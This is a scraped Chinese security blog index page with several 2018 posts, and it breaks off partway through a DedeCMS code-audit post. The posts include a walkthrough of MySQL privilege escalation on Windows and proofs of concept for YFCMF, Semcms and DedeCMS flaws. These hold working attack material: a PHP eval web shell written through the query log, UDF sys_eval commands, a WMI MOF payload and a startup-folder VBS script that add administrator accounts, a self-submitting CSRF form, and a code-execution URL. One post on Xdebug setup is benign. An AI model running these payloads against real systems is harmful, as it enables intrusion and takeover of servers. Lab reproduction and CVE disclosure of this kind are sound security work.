<!DOCTYPE html>
<html lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
        <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
    <title>
        
            Hpdoger
        
    </title>
    <link rel="icon" href="/img/favicon.png">
    <link rel="stylesheet" href="/css/style.css">
    <link rel="stylesheet" href="/css/font-awesome.min.css">
    <link rel="stylesheet" href="/css/gitment.css">
    <link rel="stylesheet" href="/css/hljs.min.css">
    <script src="/js/hljs.min.js"></script>  
    <script src="/js/gitment.browser.js"></script>  
</head>
<body>
    <header class="header" id="header">
    <h1>
        <a class="title" href="/">
            Hpdoger
        </a>
    </h1>
    <h2>
        <a class="motto">
            Ponyo loves Sōsuke!
        </a>
    </h2>
    <nav class="navbar">
        <ul class="menu">
            
            
                <li class="menu-item">
                    <a href="/" class="menu-item-link">
                        Home
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/archives/" class="menu-item-link">
                        Archives
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/about/" class="menu-item-link">
                        About
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/friends/" class="menu-item-link">
                        Friends
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="https://github.com/Hpd0ger" class="menu-item-link">
                        Github
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/atom.xml" class="menu-item-link">
                        RSS
                    </a>
                </li>
            
                
            
                
                
                <li class="menu-item">
                    <a class="menu-item-link search">
                        Search                   
                        <i class="fa fa-long-arrow-right search-icon" aria-hidden="true"></i>
                    </a>
                        <input placeholder="Search..." class="search-input" style="display:none;border:none!important;" onkeydown="onEnter(event)" onkeypress="onEnter(event)">
                </li>
                
        </ul>
    </nav>
</header>
    <main class="main">
        <section class="posts">
    
        <article class="post">
            <h1>
                <a class="title" href="/2018/09/08/基于Windows下mysql的一些提权分析/"> 
                    基于Windows下mysql的一些提权分析 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-09-08   
                </a>
                
                
                
                    
            </div>
            <div class="content">
                
                <h1 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h1><p>这篇文章是写基于windows环境下的一些mysql提权方法的分析并利用。这些方法老生常谈，但困于很多文章在讲分析和利用的时候模棱两可，因此想总结一下常见的方法思路。基于windows的提权姿势多的数不胜数，一般在配置文件可以嗅探到root密码的情况（root密码已知）下，或者注入、爆破拿到root密码下，可以考虑mysql提权。文章内容很基础，下面对这些方法进行一些粗谈，有什么理解错误的地方还请客观们轻打…大佬们可以略过这篇文章qaq…</p>
<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>靶机A： Windows 7 SP1<br>靶机B： Windows server 2003 enterprise x64<br>Phpstudy搭建的php+mysql<br>php版本：5.4.45<br>mysql版本：5.5.53<br>攻击环境：已知root账号密码，网站存在phpmyadmin页面</p>
<h1 id="通过phpmyadmin来getshell"><a href="#通过phpmyadmin来getshell" class="headerlink" title="通过phpmyadmin来getshell"></a>通过phpmyadmin来getshell</h1><h2 id="简单测试"><a href="#简单测试" class="headerlink" title="简单测试"></a>简单测试</h2><p>利用log变量，猜一下绝对路径<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224310-0a604df6-9987-1.png" alt><br>看到phpstudy，猜测根目录在WWW下，into outfile写个马测一下能传不<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224334-18b3e6b0-9987-1.png" alt><br>果然是用不成into outfile，因为file_priv为null，那么尝试使用日志写马</p>
<h2 id="利用日志写shell"><a href="#利用日志写shell" class="headerlink" title="利用日志写shell"></a>利用日志写shell</h2><p>开启日志记录</p>
<pre><code>set global general_log=&#39;on&#39;;</code></pre><p>日志文件导出指定目录</p>
<pre><code>set global general_log_file=&#39;C:/phpstudy/WWW/hp.php&#39;;</code></pre><p>记录sql语句写马，这里我就是演示一下，没有安全狗，直接传原马</p>
<pre><code>select &#39;&lt;?php @eval($_POST[&quot;hp&quot;]); ?&gt;&#39;;</code></pre><p>关闭记录</p>
<pre><code>set global general_log=off;</code></pre><h2 id="菜刀连接"><a href="#菜刀连接" class="headerlink" title="菜刀连接"></a>菜刀连接</h2><p>url: 192.168.11.106/hp.php<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224350-22085dea-9987-1.png" alt><br>看一下权限，普通成员hpd0egr，创建用户错误5。<br>接下来开始提权之路！</p>
<h1 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h1><h2 id="什么是UDF"><a href="#什么是UDF" class="headerlink" title="什么是UDF"></a>什么是UDF</h2><p>UDF(user-defined function)是MySQL的一个拓展接口，也可称之为<strong>用户自定义函数</strong>，它是用来拓展MySQL的技术手段，可以说是数据库功能的一种扩展，用户通过自定义函数来实现在MySQL中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像本机函数如ABS()或SOUNDEX()一样方便。</p>
<h2 id="提权原理"><a href="#提权原理" class="headerlink" title="提权原理"></a>提权原理</h2><p>先学习一下什么叫动态链接库</p>
<h3 id="动态链接库"><a href="#动态链接库" class="headerlink" title="动态链接库"></a>动态链接库</h3><p>动态链接库：是把程序代码中会使用的函数编译成机器码，不过是保存在.dll文件中。另外在编译时，不会把函数的机器码复制一份到可执行文件中。编译器只会在.exe的执行文件里，说明所要调用的函数放在哪一个*.dll文件。程序执行使用到这些函数时，操作系统会把dll文件中的函数拿出来给执行文件使用</p>
<h3 id="提权分析"><a href="#提权分析" class="headerlink" title="提权分析"></a>提权分析</h3><p>udf是Mysql类提权的方式之一。前提是已知mysql中root的账号密码，我们在拿到webshell后，可以看网站根目录下的config.php里，一般都有mysql的账号密码。利用root权限，创建带有调用cmd函数的’udf.dll’(动态链接库)。当我们把’udf.dll’导出指定文件夹引入Mysql时，其中的调用函数拿出来当作mysql的函数使用。这样我们自定义的函数才被当作本机函数执行。在使用CREAT FUNCITON调用dll中的函数后，mysql账号转化为system权限，从而来提权。</p>
<h2 id="提权复现"><a href="#提权复现" class="headerlink" title="提权复现"></a>提权复现</h2><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>这里我用暗月的马，改了一些参数。后面我会把所有工具打包</p>
<h3 id="访问提权马"><a href="#访问提权马" class="headerlink" title="访问提权马"></a>访问提权马</h3><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224415-309ea058-9987-1.png" alt></p>
<h3 id="导出dll到指定目录"><a href="#导出dll到指定目录" class="headerlink" title="导出dll到指定目录"></a>导出dll到指定目录</h3><p>利用提权马将写在其中的二进制导出一个dll到指定目录，但导出的dll文件路径有要求</p>
<ul>
<li><p>Mysql版本小于5.1版本。udf.dll文件在Windows2003下放置于c:\windows\system32，在windows2000下放置于c:\winnt\system32。</p>
</li>
<li><p>Mysql版本大于5.1版本udf.dll文件必须放置于MYSQL安装目录下的lib\plugin文件夹下。</p>
</li>
</ul>
<p><strong>但是大于5.1版本的时候没有plugin这个文件夹，需要我们自己创建。</strong></p>
<p>靶机mysql版本为5.5，那我们只能自己创建一个plugin文件夹了，先用<code>select @@basedir;</code>获取安装目录。</p>
<p>在该目录下创建一个plugin文件夹，网上有大神说可以用ntfs创建目录，感兴趣的话可以研究一下，我这里直接菜刀新建</p>
<p>这个提权马自带的导出要用到Into dumpfile，但是file_priv为Null这个问题限制了我们，就算我们修改了my.ini文件也要重启mysql，那我们直接传一个dll上去吧，文件名为<code>hpudf.dll</code>如图</p>
<h3 id="将udf的自定义函数引入"><a href="#将udf的自定义函数引入" class="headerlink" title="将udf的自定义函数引入"></a>将udf的自定义函数引入</h3><p>我们刚才只是把udf的动态链接库导出到指定文件夹，还不能使用里面的自定义函数。要想使用自定义函数，就要把udf.dll中的自定义函数引入。</p>
<p>引入sys_eval函数：</p>
<pre><code>CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;hpudf.dll&#39;</code></pre><p>其中，sys_eval函数是执行任意命令，并将输出返回函数的名字，hpudf.dll是你导出文件的名字;</p>
<p>常见的函数如下：</p>
<pre><code>cmdshell 执行cmd;

downloader 下载者,到网上下载指定文件并保存到指定目录;

open3389 通用开3389终端服务,可指定端口(不改端口无需重启);

backshell 反弹Shell;

ProcessView 枚举系统进程;

KillProcess 终止指定进程;

regread 读注册表;

regwrite 写注册表;

shut 关机,注销,重启;

about 说明与帮助函数;</code></pre><h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><p>执行命令模板：</p>
<pre><code>select sys_eval(&#39;ipconfig)</code></pre><p>添加用户/管理员<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224507-4fc7644c-9987-1.png" alt></p>
<p>查看一下用户<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224525-5ad82b8c-9987-1.png" alt></p>
<p>get it~</p>
<h1 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h1><p>MOF提权的条件要求十分严苛：</p>
<ol>
<li>windows 03及以下版本</li>
<li>mysql启动身份具有权限去读写c:/windows/system32/wbem/mof目录</li>
<li>secure-file-priv参数不为null</li>
</ol>
<p>mysql以root身份启动，具有c盘下system32/wbem/mof这点权限的要求，就已经非常严格了。。而且win7 sp1就已经没有这个nullevt.mof这个文件了，那么这里记一下poc，来对windows 03的机子进行验证。</p>
<h2 id="MOF文件"><a href="#MOF文件" class="headerlink" title="MOF文件"></a>MOF文件</h2><p>托管对象格式 (MOF) 文件是创建和注册提供程序、事件类别和事件的简便方法。文件路径为：c:/windows/system32/wbme/mof/，其作用是每隔五秒就会去监控进程创建和死亡。</p>
<h2 id="提权原理-1"><a href="#提权原理-1" class="headerlink" title="提权原理"></a>提权原理</h2><p>MOF文件每五秒就会执行，而且是系统权限，我们通过mysql使用load_file 将文件写入/wbme/mof，然后系统每隔五秒就会执行一次我们上传的MOF。MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。</p>
<h2 id="公开的nullevt-mof利用代码"><a href="#公开的nullevt-mof利用代码" class="headerlink" title="公开的nullevt.mof利用代码"></a>公开的nullevt.mof利用代码</h2><pre><code>#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)
instance of __EventFilter as $EventFilter
{
EventNamespace = &quot;Root\\Cimv2&quot;;
Name = &quot;filtP2&quot;;
Query = &quot;Select * From __InstanceModificationEvent &quot;
&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;
&quot;And TargetInstance.Second = 5&quot;;
QueryLanguage = &quot;WQL&quot;;
};
instance of ActiveScriptEventConsumer as $Consumer
{
Name = &quot;consPCSV2&quot;;
ScriptingEngine = &quot;JScript&quot;;
ScriptText =
&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user hpdoger 123456 /add\&quot;)&quot;;
};
instance of __FilterToConsumerBinding
{
Consumer = $Consumer;
Filter = $EventFilter;
};</code></pre><h2 id="MOF文件利用"><a href="#MOF文件利用" class="headerlink" title="MOF文件利用"></a>MOF文件利用</h2><p>将上面的脚本上传到有读写权限的目录下：</p>
<p>这里我上传到了<code>C:\Documents and Settings\test</code></p>
<p>根据前面的phpmyadmin，我们使用sql语句将文件导入到<code>c:/windows/system32/wbem/mof/</code>下<br>payload:</p>
<pre><code>select load_file(&quot;C:/Documents and Settings/testtest.mof&quot;) into dumpfile &quot;c:/windows/system32/wbem/mof/nullevt.mof&quot;</code></pre><p>值得一提的是，这里不能使用outfile，因为会在末端写入新行，因此mof在被当作二进制文件无法正常执行，所以我们用dumpfile导出一行数据。</p>
<h2 id="验证提权"><a href="#验证提权" class="headerlink" title="验证提权"></a>验证提权</h2><p>当我们成功把mof导出时，mof就会直接被执行，且5秒创建一次用户。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806224611-75eaad5a-9987-1.png" alt><br>可以看到，我们在test的普通用户下直接添加了hpdoger用户。剩下的操作就是用户命令处，换成加入administrator语句即可：</p>
<pre><code>net.exe user localgroup administrator hpdoger /add\</code></pre><h2 id="关于Mof提权的弊端"><a href="#关于Mof提权的弊端" class="headerlink" title="关于Mof提权的弊端"></a>关于Mof提权的弊端</h2><p>我们提权成功后，就算被删号，mof也会在五秒内将原账号重建，那么这给我们退出测试造成了很大的困扰，所以谨慎使用。那么我们如何删掉我们的入侵账号呢？</p>
<p>cmd 下运行下面语句:</p>
<pre><code>net stop winmgmt
del c:/windows/system32/wbem/repository
net start winmgmt</code></pre><p>重启服务即可。</p>
<h1 id="启动项提权"><a href="#启动项提权" class="headerlink" title="启动项提权"></a>启动项提权</h1><p>在前两种方法都失败时，那可以试一下这个苟延残喘的启动项提权..因为要求达到的条件和mof几乎一样，并且要重启服务，所以不是十分推荐。原理还是使用mysql写文件，写入一段VBS代码到开机自启动中，服务器重启达到创建用户并提权，可以使用DDOS迫使服务器重启。</p>
<h2 id="提权条件"><a href="#提权条件" class="headerlink" title="提权条件"></a>提权条件</h2><p>file_priv 不为null<br>已知root密码</p>
<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><pre><code>create table a (cmd text); 
insert into a values (&quot;set wshshell=createobject (&quot;&quot;wscript.shell&quot;&quot;) &quot; ); 
insert into a values (&quot;a=wshshell.run (&quot;&quot;cmd.exe /c net user hpdoger 123456 /add&quot;&quot;,0) &quot; ); 
insert into a values (&quot;b=wshshell.run (&quot;&quot;cmd.exe /c net localgroup administrators hpdoger /add&quot;&quot;,0) &quot; ); 
select * from a into outfile &quot;C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\a.vbs&quot;;</code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>还有很多cve这里没有复现到。Mysql提权在如今被各种因素限制，但掌握这一门技术或多或少对我们都还是有所帮助的</p>

                
            </div>
            <div class="continue">
            <a href="/2018/09/08/基于Windows下mysql的一些提权分析/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/08/25/Phpstorm + phpstudy + Xdebug代码审计环境/"> 
                    Phpstorm + phpstudy + Xdebug代码审计环境 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-08-25   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
            </div>
            <div class="content">
                
                <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>硬着头皮挖了一些，也算是完成了之前一个月内出cve的任务：<br>1、YFCMF:<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16431" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16431</a><br>2、SQL in Bluecms1.6:<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16432" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16432</a><br>3、XSS in Semcms:<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16433" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16433</a><br>4、SQL in Semcms:<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16434" target="_blank" rel="noopener">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-16434</a></p>
<p>但想学好代码审计还有很长的路要走，勿忘初心，开始正题~</p>
<h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><h3 id="安装php-xdebug-dll"><a href="#安装php-xdebug-dll" class="headerlink" title="安装php_xdebug.dll"></a>安装php_xdebug.dll</h3><p>phpstudy自带各版本的xdebug.dll插件</p>
<p>在相应目录，如5.6.27版本下的在：phpStudy\PHPTutorial\php\php-5.6.27-nts\ext\php_xdebug.dll</p>
<h3 id="配置php-ini"><a href="#配置php-ini" class="headerlink" title="配置php.ini"></a>配置php.ini</h3><p>php.ini在相应目录，如5.6.27版本下的在：\phpStudy\PHPTutorial\php\php-5.6.27-nts\php.ini</p>
<p>在Xdebug部分加如下内容：</p>
<pre><code>[XDebug]
zend_extension=&quot;D:\phpStudy\PHPTutorial\php\php-5.6.27-nts\ext\php_xdebug.dll&quot;
xdebug.profiler_append = 0
xdebug.profiler_enable = 1
xdebug.profiler_enable_trigger = 0
xdebug.profiler_output_dir=&quot;D:\phpStudy\PHPTutorial\tmp\xdebug&quot;
xdebug.trace_output_dir=&quot;D:\phpStudy\PHPTutorial\tmp\xdebug&quot;
xdebug.profiler_output_name = &quot;cache.out.%t-%s&quot;
xdebug.remote_enable = 1
xdebug.remote_handler = &quot;dbgp&quot;
xdebug.remote_host = &quot;127.0.0.1&quot;
xdebug.remote_port = 9000
xdebug.idekey = PHPSTORM</code></pre><p>zend_extension：插件地址<br>xdebug.remote_port = 9000 : Xdebug监听地址<br>xdebug.idekey = PHPSTORM： idekey名称（与后面设置对应）</p>
<h3 id="设置php解释器"><a href="#设置php解释器" class="headerlink" title="设置php解释器"></a>设置php解释器</h3><p>![](Delete Link<br><a href="https://i.loli.net/2018/08/25/5b8157cb1f00f.png" target="_blank" rel="noopener">https://i.loli.net/2018/08/25/5b8157cb1f00f.png</a>)</p>
<p>这里我用的是5.6.27版本的</p>
<h3 id="设置xdebug参数"><a href="#设置xdebug参数" class="headerlink" title="设置xdebug参数"></a>设置xdebug参数</h3><p>Debug里设置监听地址：<br><img src="https://i.loli.net/2018/08/25/5b8157cb63338.jpg" alt></p>
<p>接着设置代理：<br><img src="https://i.loli.net/2018/08/25/5b8157cb56aba.jpg" alt></p>
<h3 id="配置Debug"><a href="#配置Debug" class="headerlink" title="配置Debug"></a>配置Debug</h3><p>运行–&gt;编辑配置</p>
<p>Defaults–&gt;Web Page<br><img src="https://i.loli.net/2018/08/25/5b8157cb673a3.png" alt></p>
<p>新增一个服务端，填写信息如图，要点击应用和确认<br><img src="https://i.loli.net/2018/08/25/5b8157cb55242.png" alt></p>
<p>回到上级页面后别忘了选择刚才添加的server</p>
<h3 id="浏览器安装debug插件"><a href="#浏览器安装debug插件" class="headerlink" title="浏览器安装debug插件"></a>浏览器安装debug插件</h3><p>下面我是使用火狐的插件xdebug-ext进行调试，因为审计用得比较多的就是火狐了插件多</p>
<p>IDE key也要对应上我们的配置：<br><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/phpstorm6.png" alt></p>
<h2 id="调试测试"><a href="#调试测试" class="headerlink" title="调试测试"></a>调试测试</h2><h3 id="新建一个工程"><a href="#新建一个工程" class="headerlink" title="新建一个工程"></a>新建一个工程</h3><h3 id="浏览器开启debug"><a href="#浏览器开启debug" class="headerlink" title="浏览器开启debug"></a>浏览器开启debug</h3><p>在需要debug的页面点击右上图标为红色时：<br><img src="https://i.loli.net/2018/08/25/5b8158615412d.jpg" alt></p>
<h3 id="设置断点"><a href="#设置断点" class="headerlink" title="设置断点"></a>设置断点</h3><h3 id="phpstorm开启debug"><a href="#phpstorm开启debug" class="headerlink" title="phpstorm开启debug"></a>phpstorm开启debug</h3><p>点击右上角的小电话开启，再点左边的绿色甲壳虫图标进行调试</p>
<p>传参后看结果<br><img src="https://i.loli.net/2018/08/25/5b81588414c88.png" alt></p>

                
            </div>
            <div class="continue">
            <a href="/2018/08/25/Phpstorm + phpstudy + Xdebug代码审计环境/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/08/23/Csrf in YFCMF 3.0/"> 
                    Csrf in YFCMF 3.0 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-08-23   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve/">cve</a></li></ul>
            </div>
            <div class="content">
                
                <h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>The background administrator adds CSRF to the page, causing other administrator accounts to add.</p>
<h2 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2><pre><code>&lt;html&gt;
    &lt;form action=&quot;/YFCMF/admin/admin/adminsave.html&quot; method=&quot;post&quot;&gt;
        &lt;select name=&quot;group_id&quot; required=&quot;&quot;&gt;
            &lt;option value=&quot;2&quot;/&gt;
        &lt;/select&gt;
        &lt;input name=&quot;username&quot; value=&quot;csrf&quot; type=&quot;hidden&quot;/&gt;
        &lt;input name=&quot;password&quot; value=&quot;123&quot; type=&quot;hidden&quot;/&gt;
        &lt;input name=&quot;email&quot; value=&quot;csrf@1.com&quot; type=&quot;hidden&quot;/&gt;
        &lt;input name=&quot;realname&quot; value=&quot;csrf&quot; type=&quot;hidden&quot;/&gt;
    &lt;/form&gt;
    &lt;script&gt;
        document.forms[0].submit();
    &lt;/script&gt;
&lt;/html&gt;</code></pre><h2 id="Reappearance"><a href="#Reappearance" class="headerlink" title="Reappearance"></a>Reappearance</h2><p>1、View original users<br><img src="https://i.loli.net/2018/08/23/5b7e6aac7c4f4.png" alt></p>
<p>2、Accessing structured CSRF pages<br><img src="https://i.loli.net/2018/08/23/5b7e6aac7ded1.png" alt></p>
<p>3、Successfully added<br><img src="https://i.loli.net/2018/08/23/5b7e6aac970b0.png" alt><br><img src="https://i.loli.net/2018/08/23/5b7e6aacc099b.png" alt></p>

                
            </div>
            <div class="continue">
            <a href="/2018/08/23/Csrf in YFCMF 3.0/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/08/23/Arbitrary File upload in Semcms V2.7/"> 
                    Arbitrary File upload in Semcms V2.7 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-08-23   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve/">cve</a></li></ul>
            </div>
            <div class="content">
                
                <h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>php Background pages restrict the type of uploaded files, jpe, gif, rar,we can break through the restrictions on uploading malicious files such as: PHP.</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><p>The affected code(located:/ciuy_Admin/SEMCMS_Upfile.php):</p>
<pre><code>$newname=test_input($_POST[&quot;wname&quot;]).&quot;.&quot;.end($uptype)</code></pre><p>We could control the “wname” as we want,and uptype is the suffix which intercepted in allow</p>
<h2 id="Founction"><a href="#Founction" class="headerlink" title="Founction"></a>Founction</h2><p>The attaking founction:use char(0) to cut off the filename and make up a renew suffix</p>
<p>The affected page located in admin’s management page:<code>ciuy_Admin/SEMCMS_Upfile.php</code></p>
<h2 id="Reappearance"><a href="#Reappearance" class="headerlink" title="Reappearance"></a>Reappearance</h2><p>First,we define our evil php’s suffix as test.rar(which is allowed) and post it as follow.There,we could see no files in the Folder</p>
<p>Second,we change the php as php0x00 and the effection as :<br><img src="https://i.loli.net/2018/08/23/5b7e13304a88d.png" alt></p>
<p>final effection and poc:<br><img src="https://i.loli.net/2018/08/23/5b7e13ba8c3e3.jpg" alt><br><img src="https://i.loli.net/2018/08/23/5b7e141646860.jpg" alt></p>
<p>Then, we could see the test.php in the folder:<br><img src="https://i.loli.net/2018/08/23/5b7e142f6dfac.png" alt></p>
<p>Finally, we could use tools (Cknife) to link the evil php<br><img src="https://i.loli.net/2018/08/23/5b7e147a46853.png" alt></p>
<h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>This is a background getshell process. The required PHP version is less than 5.3</p>

                
            </div>
            <div class="continue">
            <a href="/2018/08/23/Arbitrary File upload in Semcms V2.7/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/08/21/Dedecms V5.7 SP2代码审计/"> 
                    Dedecms V5.7 SP2代码审计 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-08-21   
                </a>
                
                <a class="category">
                    <i class="fa fa-th" aria-hidden="true"></i>  
                </a>
               
                <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/">代码审计</a></li></ul>
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
            </div>
            <div class="content">
                
                <h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>首发于安全客：<a href="https://www.anquanke.com/post/id/157522" target="_blank" rel="noopener">代码审计入门级DedecmsV5.7 SP2分析复现</a></p>
<h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p>Dedecms的洞有很多，而最新版的v5.7 sp2更新止步于1月。作为一个审计小白,看过《代码审计-企业级Web代码安全构架》后，偶然网上冲浪看到mochazz师傅在blog发的审计项目,十分有感触。跟着复现了两个dedecms代码执行的cve,以一个新手的视角重新审视这些代码，希望文章可以帮助像我这样入门审计不久的表哥们。文章若有片面或不足的地方还请师傅们多多斧正</p>
<h2 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h2><p>php5.45 + mysql<br>审计对象：DedeCMS V5.7 SP2<br>工具：seay源码审计</p>
<h2 id="后台代码执行"><a href="#后台代码执行" class="headerlink" title="后台代码执行"></a>后台代码执行</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>DedeCMS V5.7 SP2版本中tpl.php存在代码执行漏洞，攻击者可利用该漏洞在增加新的标签中上传木马，获取webshell</p>
<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>漏洞位置：dede/tpl.php</p>
<p>看一下核心代码：</p>
<pre><code># /dede/tpl.php
&lt;?php
require_once(dirname(__FILE__).&quot;/config.php&quot;);
CheckPurview(&#39;plus_文件管理器&#39;);

$action = isset($action) ? trim($action) : &#39;&#39;;
......
if(empty($filename))    $filename = &#39;&#39;;
$filename = preg_replace(&quot;#[\/\\\\]#&quot;, &#39;&#39;, $filename);
......
else if($action==&#39;savetagfile&#39;)
{
    csrf_check();
    if(!preg_match(&quot;#^[a-z0-9_-]{1,}\.lib\.php$#i&quot;, $filename))
    {
        ShowMsg(&#39;文件名不合法，不允许进行操作！&#39;, &#39;-1&#39;);
        exit();
    }
    require_once(DEDEINC.&#39;/oxwindow.class.php&#39;);
    $tagname = preg_replace(&quot;#\.lib\.php$#i&quot;, &quot;&quot;, $filename);
    $content = stripslashes($content);
    $truefile = DEDEINC.&#39;/taglib/&#39;.$filename;
    $fp = fopen($truefile, &#39;w&#39;);
    fwrite($fp, $content);
    fclose($fp);
    ......
}</code></pre><p>因为dedecms全局变量注册(register_globals=on)，这里有两个可控变量$filename&amp;$content</p>
<p>action=savetag时，进行csrf()检测</p>
<pre><code>function csrf_check()
{
    global $token;

    if(!isset($token) || strcasecmp($token, $_SESSION[&#39;token&#39;]) != 0){
        echo &#39;&lt;a href=&quot;http://bbs.dedecms.com/907721.html&quot;&gt;DedeCMS:CSRF Token Check Failed!&lt;/a&gt;&#39;;
        exit;
    }
}</code></pre><p>验证token和已知的session是否相等，那么token的值从何获取呢？</p>
<p>回溯tpl.php，追踪一下token：</p>
<pre><code>else if ($action == &#39;upload&#39;)
{
        ....
        &lt;input name=&#39;acdir&#39; type=&#39;hidden&#39; value=&#39;$acdir&#39;  /&gt;
        &lt;input name=&#39;token&#39; type=&#39;hidden&#39; value=&#39;{$_SESSION[&#39;token&#39;]}&#39;  /&gt;
        &lt;input name=&#39;upfile&#39; type=&#39;file&#39; id=&#39;upfile&#39; style=&#39;width:380px&#39; /&gt;
}</code></pre><p>当action=upload时，隐藏表单的value提交token值<br><img src="https://s1.ax1x.com/2018/08/21/PIOS7n.png" alt></p>
<p>token搞定了，再让我们继续往下审~</p>
<pre><code>$truefile = DEDEINC.&#39;/taglib/&#39;.$filename;</code></pre><p>传入的filename必须为 xxxx.lib.php，并且保存的也是php文件</p>
<pre><code>    fwrite($fp, $content);
    fclose($fp);</code></pre><p>写入内容为$content…那岂不是为所欲为..<br>poc:</p>
<pre><code>http://localhost/dedecms/uploads/dede/tpl.php?action=savetagfile&amp;filename=hpdoger.lib.php&amp;content=&lt;?php phpinfo();?&gt;&amp;token=55f2eb0ad241e1893276ed1f8e7dd5fa</code></pre><p>在include/taglib下会产生相应xxx.lib.php</p>
<h2 id="后台代码执行Getshell"><a href="#后台代码执行Getshell" class="headerlink" title="后台代码执行Getshell"></a>后台代码执行Getshell</h2><h3 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h3><p>问题代码位于：/uploads/plus/ad_js.php</p>
<pre><code> */
require_once(dirname(__FILE__).&quot;/../include/common.inc.php&quot;);

if(isset($arcID)) $aid = $arcID;
